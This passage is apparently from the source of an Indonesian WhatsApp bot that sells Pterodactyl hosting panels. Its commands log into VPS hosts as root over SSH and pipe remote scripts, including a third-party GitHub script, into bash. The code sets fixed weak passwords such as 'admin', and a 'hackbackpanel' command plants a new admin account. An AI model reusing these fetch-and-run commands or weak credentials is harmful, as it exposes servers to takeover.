stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|global.domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Nvidia.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('New York\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By FR3botz\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By FR3botz\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings 🔥*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom(""); 
const newpw = "admin" + "001" 

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Nvidia.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("fr3|ipserver"))
if (!text.split("|")) return m.reply(example("fr3|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("-_Domain tidak ditemukan!_-")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

case "toadmin": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (text.includes(" ")) return m.reply("⚠️ Username tidak boleh mengandung spasi, coba lagi!");
if (!text) return m.reply(example("username"))
await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: 'action',
      buttonText: { displayText: 'ini pesan interactiveMeta' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'PILIH',
          sections: [
            {
              title: 'List Admin Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'CREAT ADMIN V1',
                  id: `.cadmin ${text}`
                },
                {
                  title: 'CREAT ADMIN V2',
                  id: `.cadmin-v2 ${text}`
                },
                {
                  title: 'CREAT ADMIN V3',
                  id: `.cadmin-v3 ${text}`
                },
                {
                  title: 'CREAT ADMIN V4',
                  id: `.cadmin-v4 ${text}`
                },
                {
                  title: 'CREAT ADMIN V5',
                  id: `.cadmin-v5 ${text}`
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 1,
  viewOnce: true,
  text: "PILIH ADMIN PANEL\n",
  contextInfo: {
    isForwarded: true,
    mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
  }
}, { quoted: m });
}
break

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@fr3.com"
let name = capital(args[0])
let password = username+"FR3_"+crypto.randomBytes(2).toString('hex')
let f = await fetch(global.domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Gmail:* ${username+"@fr3.com"}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "cpatner": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@fr3.com"
let name = capital(args[0])
let password = username+"FR3_"+crypto.randomBytes(2).toString('hex')
let f = await fetch(global.domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Patner",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Patner Panel ✅*

* *ID :* ${user.id}
* *Gmail:* ${username+"@fr3.com"}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*⚠️ Rules Partner Panel:*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "cowner": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@fr3.com"
let name = capital(args[0])
let password = username+"FR3_"+crypto.randomBytes(2).toString('hex')
let f = await fetch(global.domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Owner",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Owner Panel ✅*

* *ID :* ${user.id}
* *Gmail:* ${username+"@fr3.com"}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*⚠️ Rules Owner Panel:*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@fr3.com"
let name = capital(args[0])
let password = username+"FR3"
let f = await fetch(global.domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "addsc": {
 if (!isOwner) return Reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

 let teks = `
 ❌ *Format salah!*\nGunakan perintah:\n.addsc <NamaScript>|<Harga>|<Link>\n\nContoh:\n/addscript NvidiaBotz FR3 [V1]|30000|https://mediafire.com/file.zip
 `;
 
  const args = text.split('|'); // Menggunakan pipe sebagai pemisah argumen

 if (args.length < 3) {
 return Reply(
 `❌ *Format salah!*\nGunakan perintah:\n.addsc <NamaScript>|<Harga>|<Link>\n\nContoh:\n.addsc NvidiaBotz FR3 [V1]|40000|https://mediafire.com/file.zip`
 );
 } 
 const [name, price, ...urlArray] = args;
 const url = urlArray.join(' ');
 const newScript = { name, price: parseInt(price), url };

 if (!global.scripts) global.scripts = [];
 global.scripts.push(newScript);

 Reply(`✅ *Script baru berhasil ditambahkan!*\n\n📜 *Nama*: ${name}\n💸 *Harga*: Rp${price}\n🔗 *Link*: ${url}`);
 break;
}

case "delsc": {
 if (!isOwner) return Reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

 if (!text || isNaN(text)) {
 return Reply(
 `❌ *Format salah!*\nGunakan perintah:\n.delsc <NomorScript>\n\nContoh:\n/delscript 1`
 );
 }

 const scriptIndex = parseInt(text);

 if (!global.scripts || scriptIndex < 1 || scriptIndex > global.scripts.length) {
 return Reply('❌ Nomor script tidak valid! Ketik `/listsc` untuk melihat daftar script.');
 }

 const deletedScript = global.scripts.splice(scriptIndex - 1, 1)[0];

 Reply(`✅ *Script berhasil dihapus!*\n\n📜 *Nama*: ${deletedScript.name}`);
 break;
}

case "editsc": {
 if (!isOwner) return Reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

 if (!text) {
 return Reply(
 `❌ *Format salah!*\nGunakan perintah:\n.editsc <NomorScript> <Nama/Harga> <NilaiBaru>\n\nContoh:\n.editsc 1 Nama RafanoV5`
 );
 }

 const args = text.split(' ');
 if (args.length < 3) {
 return Reply(
 `❌ *Format salah!*\nGunakan perintah:\n.editsc <NomorScript> <Nama/Harga> <NilaiBaru>\n\nContoh:\n/editsc 1 Nama RafanoV5`
 );
 }

 const [scriptIndex, field, ...newValueArray] = args;
 const newValue = newValueArray.join(' ');

 if (isNaN(scriptIndex) || scriptIndex < 1 || scriptIndex > (global.scripts || []).length) {
 return Reply('❌ Nomor script tidak valid! Ketik `/listsc` untuk melihat daftar script.');
 }

 const scriptToEdit = global.scripts[scriptIndex - 1];

 // Validasi field
 if (!['Nama', 'Harga'].includes(field)) {
 return Reply(
 `❌ Field tidak valid! Hanya dapat mengubah: Nama, Harga.\nContoh:\n.editscript 1 Nama RafanoV5`
 );
 }

 // Edit script berdasarkan field
 if (field === 'Nama') scriptToEdit.name = newValue;
 if (field === 'Harga') scriptToEdit.price = parseInt(newValue);

 Reply(`✅ *Script berhasil diperbarui!*\n\n📜 *Nama*: ${scriptToEdit.name}\n💸 *Harga*: Rp${scriptToEdit.price.toLocaleString('id-ID')}`);
 break;
}

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller fr3 hosting✅`)
}
break

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Nvidia.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

case "delseller": {
  if (!isCreator) return Reply(mess.owner)

  if (!premium || premium.length < 1) return m.reply("❌ Tidak ada reseller terdaftar.")

  // Buat sections nativeFlowInfo
  const sections = [
    {
      title: "📂 LIST RESELLER TERDAFTAR",
      highlight_label: "🗑️ Hapus Reseller",
      rows: premium.map(id => ({
        title: id.split("@")[0],
        description: "Klik untuk menghapus reseller ini",
        id: `.delsellerconfirm ${id}`
      }))
    }
  ]

  const pesan = `╭─── 〔 *🗑️ HAPUS RESELLER* 〕 ───╮
📜 *Total Reseller:* ${premium.length}

🔹 Pilih reseller yang ingin dihapus dari list:
⚡ *Klik tombol di bawah!* 👇
╰────────────────────────╯`

  await Nvidia.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'pilih-reseller',
        buttonText: { displayText: '🗑️ Pilih Reseller' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: "🗑️ Pilih Reseller",
            sections
          })
        }
      }
    ],
    footer: "®FR3 DEV",
    headerType: 1,
    viewOnce: true,
    text: pesan
  }, { quoted: m })
}
break

case "delsellerconfirm": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply("❌ ID reseller tidak valid.")

  if (!premium.includes(text)) return m.reply(`❌ Nomor ${text.split("@")[0]} bukan reseller FR3 Hosting.`)

  let pos = premium.indexOf(text)
  await premium.splice(pos, 1)
  await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
  m.reply(`✅ Reseller ${text.split("@")[0]} berhasil dihapus!`)
}
break

case "addakses": {
  if (!isCreator) return Reply(mess.owner);

  // === JIKA DI GRUP ===
  if (m.isGroup && !text) {
    let db = loadAkses();
    if (db.groups.includes(m.chat)) return m.reply("✅ Grup ini sudah punya akses!");
    db.groups.push(m.chat);
    saveAkses(db);
    return m.reply(`✅ Grup *${m.chat}* berhasil diberi akses!`);
  }

  // === JIKA DI PRIVATE ATAU KIRIM COMMAND DENGAN ID GRUP ===
  if (text) {
    let db = loadAkses();
    if (db.groups.includes(text)) return m.reply("✅ Grup ini sudah punya akses!");
    db.groups.push(text);
    saveAkses(db);
    return m.reply(`✅ Grup *${text}* berhasil diberi akses!`);
  }

  // === JIKA DI PRIVATE TANPA ID GRUP ===
  const groupList = await Nvidia.groupFetchAllParticipating();
  const myGroups = Object.entries(groupList)
    .filter(([id, data]) => data?.id && data.subject)
    .map(([id, data]) => ({ id, subject: data.subject }));

  if (myGroups.length < 1) return m.reply("❌ Tidak ada grup yang kamu kelola.");

  const sections = [
    {
      title: "List Grup Yang Bisa Diberi Akses",
      rows: myGroups.map(gc => ({
        title: gc.subject,
        description: `Klik untuk beri akses ke grup ini.`,
        rowId: `.addakses ${gc.id}`
      }))
    }
  ];

  const listMessage = {
    text: "🗂️ Pilih grup yang ingin diberi akses:",
    footer: "FR3 DEV",
    buttonText: "Pilih Grup",
    sections
  };

  return Nvidia.sendMessage(m.chat, listMessage, { quoted: m });
}
break;

case "addaksesconfirm1": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return m.reply("❌ ID grup tidak valid.");

  let db = loadAkses();
  if (db.groups.includes(text)) return m.reply("✅ Grup ini sudah punya akses!");

  db.groups.push(text);
  saveAkses(db);
  m.reply(`✅ Grup *${text}* berhasil diberi akses!`);
}
break;

case "listakses": {
  if (!isCreator) return Reply(mess.owner);

  let db = loadAkses();
  if (!db.groups || db.groups.length < 1) return m.reply("❌ Belum ada grup yang diberi akses.");

  let list = db.groups.map((id, i) => `${i + 1}. ${id}`).join("\n");
  m.reply(`📋 *List Grup dengan Akses:*\n\n${list}\n\n📌 *Salin ID Grup untuk keperluan lain!*`);
}
break;

case "delakses": {
  if (!isCreator) return Reply(mess.owner);

  let db = loadAkses();

  // === JIKA DI GRUP (langsung hapus) ===
  if (m.isGroup && !text) {
    if (!db.groups.includes(m.chat)) return m.reply("❌ Grup ini belum memiliki akses.");
    db.groups = db.groups.filter(id => id !== m.chat);
    saveAkses(db);
    return m.reply(`✅ Akses grup *${m.chat}* berhasil dicabut!`);
  }

  // === JIKA DI PRIVATE ATAU DENGAN ID GRUP ===
  if (text) {
    if (!db.groups.includes(text)) return m.reply("❌ Grup ini tidak terdaftar!");
    db.groups = db.groups.filter(id => id !== text);
    saveAkses(db);
    return m.reply(`✅ Akses grup *${text}* berhasil dihapus!`);
  }

  // === JIKA DI PRIVATE TANPA ID GRUP: kirim list ===
  if (!db.groups || db.groups.length < 1) return m.reply("❌ Belum ada grup yang diberi akses.");

  const sections = [
    {
      title: "List Grup dengan Akses",
      rows: db.groups.map(id => ({
        title: id,
        description: "Klik untuk hapus akses grup ini.",
        rowId: `.delakses ${id}`
      }))
    }
  ];

  const listMessage = {
    text: "🗑️ Pilih grup yang ingin dihapus aksesnya:",
    footer: "FR3 DEV",
    buttonText: "Pilih Grup",
    sections
  };

  return Nvidia.sendMessage(m.chat, listMessage, { quoted: m });
}
break;

case "delaksesconfirm": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return m.reply("❌ ID grup tidak valid.");

  let db = JSON.parse(fs.readFileSync("./library/database/akses.json"));
  if (!db.groups.includes(text)) return m.reply("❌ Grup ini tidak terdaftar!");

  db.groups = db.groups.filter(id => id !== text);
  fs.writeFileSync("./library/database/akses.json", JSON.stringify(db, null, 2));
  m.reply(`✅ Akses grup *${text}* berhasil dihapus!`);
}
break;

case "buysc": {
    if (!m.isGroup) return Reply("❌ Fitur order hanya dapat digunakan dalam private chat.");

    if (db.users[m.sender].status_deposit) {
        return Nvidia.sendMessage(m.chat, {text: "❌ Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"});
    }

    let teks = `
    ─────────────────────────
    🎯 *Panduan Pembelian Script* 🎯
    Untuk membeli Script, ketik perintah berikut:
    Contoh penggunaan: *.buysc <nomor>*
